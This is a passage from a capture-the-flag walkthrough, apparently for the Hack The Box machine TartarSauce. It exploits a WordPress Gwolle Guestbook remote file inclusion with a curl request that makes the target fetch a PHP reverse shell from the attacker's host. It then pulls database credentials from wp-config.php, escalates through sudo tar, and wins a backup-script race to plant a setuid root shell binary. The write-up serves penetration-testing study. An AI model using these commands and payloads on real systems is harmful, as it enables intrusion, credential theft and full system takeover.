 | Latest Version: 1.1.0
 | Last Updated: 2017-09-01T00:00:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/themes/voce/readme.txt
 | Style URL: http://10.10.10.88/webservices/wp/wp-content/themes/voce/style.css
 | Style Name: voce
 | Style URI: http://limbenjamin.com/pages/voce-wp.html
 | Description: voce is a minimal theme, suitable for text heavy articles. The front page features a list of recent ...
 | Author: Benjamin Lim
 | Author URI: https://limbenjamin.com
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/themes/voce/, status: 500
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating Medias (via Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <==============================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] wpadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 8
 | Requests Remaining: 16

[+] Finished: Sat Nov  6 04:23:13 2021
[+] Requests Done: 120256
[+] Cached Requests: 18
[+] Data Sent: 34.68 MB
[+] Data Received: 23.642 MB
[+] Memory used: 386.984 MB
[+] Elapsed time: 00:08:32

```

This time, wpscan finds the "Gwolle Guestbook v2.3.10" plugin, and reports finding only one vulnerability, a XSS issue.&#x20;

{% hint style="info" %}
Always verify the version information.&#x20;
{% endhint %}

At this point, we need to question whether this is the only exploit for this plugin, or whether there may be other exploits that wpscan isn't telling us about.

Let's check the exploit-db first, and if we don't find anything else there, we'll research the plugin using google.

```
└─$ searchsploit gwolle                                                                                       5 ⨯
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                 | php/webapps/38861.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

As we can see from the output, there is a known RFI vulnerability in this plugin. Note that the version is much older than the version detected by wpscan, however, since this is all we have found at this stage, we need to investigate it further.

Let's start by verifying the version information provided by wpscan for the plugin. To do this, let's review the readme file at [http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt](http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt) and compare it to the readme file on the github repo.

In the readme on the target, we see the following version information:

> \=== Gwolle Guestbook ===&#x20;
>
> Requires at least: 3.7&#x20;
>
> Tested up to: 4.4&#x20;
>
> Stable tag: 2.3.10&#x20;
>
> License: GPLv2 or later

After a quick google search, we find the repo for the plugin, [https://github.com/wp-plugins/gwolle-gb](https://github.com/wp-plugins/gwolle-gb), with the following version information in the readme file:

> \=== Gwolle Guestbook ===&#x20;
>
> Requires at least: 3.7&#x20;
>
> Tested up to: 4.4&#x20;
>
> Stable tag: 1.5.4&#x20;
>
> License: GPLv2 or later

The latest version appears to be 1.5.4, and so it cannot be 2.3.10, as reported on the target. Looks like the administrator changed the version number to obfuscate the real version information. Based on this, we can therefore assume that it is possible that the version running could be 1.5.3, which means that the RFI vulnerability may actually work. We will have to test it to confirm as we are still not 100% sure at this stage.

According to the RFI exploit, EDB-ID 38861, an unauthenticated user can upload a PHP file with a specific name (wp-load.php), using a vulnerable PHP function in the ajaxrepsonse.php script. The function does not sanitize input to the "abspath" variable, which means we can specify our attacker system as the value for this variable.

{% hint style="danger" %}
After going through the walkthroughs, it turns out there was a hint within the readme.txt, as shown below. We see that the box creators actually tell us the version was changed specifically to trick wpscan.



\== Changelog ==

\= 2.3.10 =

* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

\= 1.5.3 =

* 2015-10-01
* When email is disabled, save it anyway when user is logged in.
* Add nb\_NO (thanks BjÃ¸rn Inge VÃ¥rvik).
* Update ru\_RU.
{% endhint %}

## Gaining Access

Let's test it by constructing the target URL as follows as per the exploit instructions:

> [http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/](http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/)

Next, let's copy the pentestmonkey PHP reverse shell and save it as wp-load.php. Change the IP and PORT variables in the file to the attackers IP and in this case, port 443, and save it.

```
└─$ cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php
```

Start a python webserver in the directory containing the wp-load.php file:

```
└─$ sudo python3 -m http.server 80
```

Start a netcat listener to catch the reverse shell connection:

```
└─$ sudo nc -nvlp 443
```

Paste the vulnerable target URL into a browser and hit enter, or use curl as follows:

```
└─$ curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/

```

Back in the listener, we get a shell. Let's upgrade the shell, and move on to local enumeration on the target system.

```
└─$ sudo nc -nvlp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.88.
Ncat: Connection from 10.10.10.88:44982.
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 06:22:20 up  2:25,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@TartarSauce:/$
```

## Enumeration as "www-data"

Let's check the system version details and listening ports:

```
www-data@TartarSauce:/var/www$ uname -a; cat /etc/*-release; netstat -antp         
uname -a; cat /etc/*-release; netstat -antp
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.10.88:80          10.10.14.6:53600        ESTABLISHED -               
tcp        0      0 10.10.10.88:80          10.10.14.6:53608        ESTABLISHED -               
tcp       22      0 10.10.10.88:44970       10.10.14.6:443          CLOSE_WAIT  5101/sh         
tcp        0    857 10.10.10.88:44982       10.10.14.6:443          ESTABLISHED 5245/sh    
```

There is a mysql database service running locally on port 3306. Let's see if we can find the creds for it. Looking in the /var/www/html/webservices/wp directory, we find the wp-config.php file which contains a set of database creds in it.

```
www-data@TartarSauce:/var/www/html/webservices/wp$ sed '/^\//d;/^[[:space:]]\*/d;/^[[:space:]]*$/d' wp-config.php
<d '/^\//d;/^[[:space:]]\*/d;/^[[:space:]]*$/d' wp-config.php                
<?php
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');
$table_prefix  = 'wp_';
define('WP_DEBUG', false);
define('WP_HOME', 'http://tartarsauce.htb/webservices/wp');
define('WP_SITEURL', 'http://tartarsauce.htb/webservices/wp');
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');
require_once(ABSPATH . 'wp-settings.php');
www-data@TartarSauce:/var/www/html/webservices/wp$
```

Let's try connect to the database and look around:

```
www-data@TartarSauce:/var/www/html/webservices$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: w0rdpr3$$d@t@b@$3@cc3$$

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 407
Server version: 5.7.22-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wp;
use wp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables; 
show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_gwolle_gb_entries  |
| wp_gwolle_gb_log      |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
14 rows in set (0.00 sec)

mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 | wpadmin       | wpadmin@test.local |          | 2018-02-09 20:49:26 |                     |           0 | wpadmin      |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

mysql>
```

We find a set of creds: wpadmin:$P$BBU0yjydBz9THONExe2kPEsvtjStGe1

The hash is Wordpress MD5, and we can try and crack it using hashcat. Let's leave this for now and continue with the enumeration.

Let's see if the "www-user" can run any commands as sudo:

```
www-data@TartarSauce:/var/www/html/webservices$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
www-data@TartarSauce:/var/www/html/webservices$ sudo -u onuma /bin/tar
sudo -u onuma /bin/tar
/bin/tar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options
Try '/bin/tar --help' or '/bin/tar --usage' for more information.

```

Let's check GTFObins for any entries for "tar":

{% embed url="https://gtfobins.github.io/gtfobins/tar" %}

There is an entry for tar. Under the Sudo section, we see the following text and example:

> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
>
> ```
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
> ```

Let's try this to see if we can get a shell as the user "onuma":

```
www-data@TartarSauce:/var/www/html/webservices$ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
</null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh             
/bin/tar: Removing leading `/' from member names
$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
$ 
```

Nice, let's upgrade the shell, and grab the user flag:

```
onuma@TartarSauce:/var/www/html/webservices$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
onuma@TartarSauce:/var/www/html/webservices$ cd ~
cd ~
onuma@TartarSauce:~$ ls
ls
shadow_bkp  user.txt
onuma@TartarSauce:~$ cat user.txt
cat user.txt
b2d6ec45472467c836f253bd170182c7
onuma@TartarSauce:~$ 

```

## Enumeration as "onuma"

Let's have a look at files and directory owned by "onuma":

```
onuma@TartarSauce:~$ find / -user onuma -ls 2>/dev/null | grep -v proc
find / -user onuma -ls 2>/dev/null | grep -v proc
   913301  11244 -rw-r--r--   1 onuma    onuma    11511673 Nov  6 09:29 /var/tmp/.eb429b243ce07e64a429e70055b1619663744aa5
   912867  11244 -rw-r--r--   1 onuma    onuma    11511673 Nov  6 09:24 /var/backups/onuma-www-dev.bak
   912225      4 drwxrw----   5 onuma    onuma        4096 Feb 21  2018 /home/onuma
   139512      4 drwxrw----   2 onuma    onuma        4096 Feb  9  2018 /home/onuma/.cache
   139513      0 -rwxrw----   1 onuma    onuma           0 Feb  9  2018 /home/onuma/.cache/motd.legal-displayed
   913290      4 -rwxrw----   1 onuma    onuma          52 Feb 17  2018 /home/onuma/.mysql_history
   922393      4 -rwxrw----   1 onuma    onuma         655 Feb  9  2018 /home/onuma/.profile
   912232      4 drwxrw----   2 onuma    onuma        4096 Feb 17  2018 /home/onuma/.nano
   912249      4 -rwxrw----   1 onuma    onuma          12 Feb 17  2018 /home/onuma/.nano/search_history
   922833      0 -rwxrw----   1 onuma    onuma           0 Feb  9  2018 /home/onuma/.sudo_as_admin_successful
   912562      4 drwxrw----   2 onuma    onuma        4096 Feb 15  2018 /home/onuma/.ssh
   912864      4 -rwxrw----   1 onuma    onuma         222 Feb 15  2018 /home/onuma/.ssh/known_hosts
   922397      4 -rwxrw----   1 onuma    onuma        3871 Feb 15  2018 /home/onuma/.bashrc
   912377      4 -r--------   1 onuma    onuma          33 Feb  9  2018 /home/onuma/user.txt
   922416      4 -rwxrw----   1 onuma    onuma         220 Feb  9  2018 /home/onuma/.bash_logout
        5      0 crw--w----   1 onuma    tty      136,   2 Nov  6 09:29 /dev/pts/2
onuma@TartarSauce:~$ file /var/backups/onuma-www-dev.bak
file /var/backups/onuma-www-dev.bak
/var/backups/onuma-www-dev.bak: gzip compressed data, last modified: Sat Nov  6 13:29:16 2021, from Unix
onuma@TartarSauce:~$

```

There is a .bak file. After checking the /etc/crontab file, we don't find anything that relates to the .bak file creation. Let's check if there are any systemd timers running jobs:

```
www-data@TartarSauce:/var/www$ systemctl status *timer
systemctl status *timer
WARNING: terminal is not fully functional
-  (press RETURN)
* systemd-tmpfiles-clean.timer - Daily Cleanup of Temporary Directories
   Loaded: loaded (/lib/systemd/system/systemd-tmpfiles-clean.timer; static; ven
   Active: active (waiting) since Sat 2021-11-06 03:56:31 EDT; 7h ago
     Docs: man:tmpfiles.d(5)
           man:systemd-tmpfiles(8)

* apt-daily.timer - Daily apt download activities
   Loaded: loaded (/lib/systemd/system/apt-daily.timer; enabled; vendor preset: 
   Active: active (waiting) since Sat 2021-11-06 03:56:31 EDT; 7h ago

* apt-daily-upgrade.timer - Daily apt upgrade and clean activities
   Loaded: loaded (/lib/systemd/system/apt-daily-upgrade.timer; enabled; vendor 
   Active: active (waiting) since Sat 2021-11-06 03:56:31 EDT; 7h ago

* backuperer.timer - Runs backuperer every 5 mins
   Loaded: loaded (/lib/systemd/system/backuperer.timer; enabled; vendor preset:
   Active: active (waiting) since Sat 2021-11-06 03:56:31 EDT; 7h ago
lines 1-17/17 (END)
lines 1-17/17 (END)q
www-data@TartarSauce:/var/www$ 
```

The entry we are interested in here is the backuperer.timer. Let's cat the file to see what it is doing:

```
www-data@TartarSauce:/var/www$ cat /lib/systemd/system/backuperer.timer
cat /lib/systemd/system/backuperer.timer
[Unit]
Description=Runs backuperer every 5 mins

[Timer]
# Time to wait after booting before we run first time
OnBootSec=5min
# Time between running each consecutive time
OnUnitActiveSec=5min
Unit=backuperer.service

[Install]
WantedBy=multi-user.target

www-data@TartarSauce:/var/www$ find / -name backuperer.service 2>/dev/null      
find / -name backuperer.service 2>/dev/null
/lib/systemd/system/backuperer.service
www-data@TartarSauce:/var/www$ cat /lib/systemd/system/backuperer.service
cat /lib/systemd/system/backuperer.service
[Unit]
Description=Backuperer

[Service]
ExecStart=/usr/sbin/backuperer

```

Now we know that the backuperer program is being run every 5 minutes. Let's run the binary to see what it does:

```
onuma@TartarSauce:/$ ls -la /usr/sbin/backuperer 
ls -la /usr/sbin/backuperer
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer
onuma@TartarSauce:/$ /usr/sbin/backuperer 
/usr/sbin/backuperer
/usr/sbin/backuperer: line 29: /var/backups/onuma_backup_test.txt: Permission denied
/bin/rm: refusing to remove '.' or '..' directory: skipping '/var/tmp/.'
/bin/rm: refusing to remove '.' or '..' directory: skipping '/var/tmp/..'
onuma is not in the sudoers file.  This incident will be reported.
^C

```

The file /usr/sbin/backuperer is actually a shell script. Let's have a look at the source code for it:

```
onuma@TartarSauce:/$ file /usr/sbin/backuperer
file /usr/sbin/backuperer
/usr/sbin/backuperer: Bourne-Again shell script, UTF-8 Unicode text executable
onuma@TartarSauce:/$ cat /usr/sbin/backuperer
cat /usr/sbin/backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
onuma@TartarSauce:/$ 

```

How does this work:

* backuperer being run as root every 5 minutes
* creates a test file /var/backups/onuma\_backup\_test.txt
* cleanup from previous backup - remove /var/tmp/.\* and /var/tmp/check
* creates a backup archive of webroot (/var/www/html) and saves in /var/tmp, command run as user onuma
  * sudo -u onuma /bin/tar -zcvf /var/tmp/.random\_chars /var/www/html
* waits 30 seconds for backup to complete
* create /var/tmp/check directory
* run tar as root to extract the archive created by onuma to the check directory: /bin/tar -zxvf /var/tmp/.random\_chars -C /var/tmp/check - creates /var/tmp/check/var/www/html ...
* do a compare between the webroot and the extracted backup of the webroot
* then either report errors (differences) and exits (leaving the extracted files until the next job run) OR
* move the /var/tmp/.random\_chars archive file to /var/backups/onuma-www-dev.bak

This is going to be a bit tricky to exploit, and so we'll need to come up with a plan.

## Privilege Escalation

In order to escalate privileges, we need to create a tar archive file which contains the /var/www/html directory structure with a SUID binary owned by root. Once we have the tar file, we need to transfer it to the target system, and wait for the backuperer script to create the temp archive with the random name. Then we need to overwrite that file with our archive within 30 seconds while the script sleeps. The script will then extract our archive, run the integrity check, which will fail, and then exit without deleting the extracted items. We can then navigate into the extracted directory containing our SUID binary and run it to get a root shell.

Steps to get root as follows:

1\. On attacker machine, create simple setuid c file and compile as 32bit binary

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setuid(0); 
    setgid(0); 
    system("/bin/sh");
}
```

```
└─$ sudo gcc -m32 setuid_sh2.c -o priv

```

2\. Create directory: /tartarsauce/var/www/html as root

```
└─$ sudo mkdir -p tartarsauce/var/www/html

└─$ cd tartarsauce
```

3\. Copy setuid into directory, and sudo chmod ug+s setuid --must setuid as root and root must own file

```
└─$ sudo cp priv var/www/html

└─$ sudo chmod ug+s var/www/html/priv

└─$ ls -la var/www/html              
total 24
drwxr-xr-x 2 root root  4096 Nov  8 06:53 .
drwxr-xr-x 3 root root  4096 Nov  8 06:52 ..
-rwsr-sr-x 1 root root 15192 Nov  8 06:53 priv

```

4\. Tar the var/ directory

```
└─$ sudo tar -zcvf privesc.tar.gz var 
var/
var/www/
var/www/html/
var/www/html/priv

```

5\. Transfer tar file to /var/tmp on target

6\. Wait until backup job runs -- "date;ls -a" OR if you have a fully interactive shell "watch -n 1 systemctl list-timers"

7\. Overwrite the /var/tmp/.randowm\_chars backup file with the one we created (must be done within 30 seconds from when the tar is created by the backup script; need to watch or refresh)

```
onuma@TartarSauce:/var/tmp$ cp privesc.tar.gz .b7e420b962837ff99dd17d1278d5091cdaf7fc93
< cp privesc.tar.gz .b7e420b962837ff99dd17d1278d5091cdaf7fc93                
onuma@TartarSauce:/var/tmp$ ls -la
ls -la
total 48
drwxrwxrwt 10 root  root  4096 Nov  8 07:06 .
drwxr-xr-x 14 root  root  4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 2675 Nov  8 07:06 .b7e420b962837ff99dd17d1278d5091cdaf7fc93
-rw-r--r--  1 onuma onuma 2675 Nov  8 06:54 privesc.tar.gz

```

8\. The script then extracts the archive. Navigate to /var/tmp/check/var/www/html

```
onuma@TartarSauce:/var/tmp$ cd check/var/www/html
cd check/var/www/html
onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
ls -la
total 24
drwxr-xr-x 2 root root  4096 Nov  8 06:53 .
drwxr-xr-x 3 root root  4096 Nov  8 06:52 ..
-rwsr-sr-x 1 root root 15192 Nov  8 06:53 priv
onuma@TartarSauce:/var/tmp/check/var/www/html$

```

9\. Run the setuid binary to get root shell

```
onuma@TartarSauce:/var/tmp/check/var/www/html$ ./priv
./priv
# id
id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(onuma)
# cd /root 
cd /root
# ls
ls
root.txt  sys.sql  wp.sql
# cat root.txt 
cat root.txt
e79abdab8b8a4b64f8579a10b2cd09f9
#
```

## Resources

​ ​ ​
